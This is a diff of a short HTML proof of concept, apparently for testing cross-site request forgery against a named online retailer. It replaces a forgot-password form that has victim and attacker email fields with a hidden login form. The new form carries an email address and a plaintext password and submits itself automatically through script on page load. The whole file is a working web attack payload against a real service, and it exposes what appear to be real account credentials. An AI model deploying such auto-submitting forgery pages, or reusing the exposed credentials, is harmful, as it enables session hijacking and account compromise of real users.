@@ -1,14 +1,12 @@
-<!DOCTYPE html>
 <html>
-<head>
-   <title>CSRF TEST</title>
-</head>
-<body>
-<form action="https://boozt.com/eu/en/api/customer/forgot-password" method="POST">
-    
-    <input type="hidden" name="victim_email" value="iqbalup18@gmail.com">
-    <input type="hidden" name="attacker_email" value="iqbalup18@gmail.com">
-    <input type="submit" value="Submit">
-</form>
-</body>
+  <body>
+    <form id="csrfForm" action="https://boozt.com/login" method="POST">
+      <input type="hidden" name="email" value="iqbalup18@gmail.com">
+      <input type="hidden" name="password" value="6115Isayevm">
+      <input type="submit" value="Click Here to Login">
+    </form>
+    <script>
+      document.getElementById("csrfForm").submit(); // Auto-submits the form
+    </script>
+  </body>
 </html>
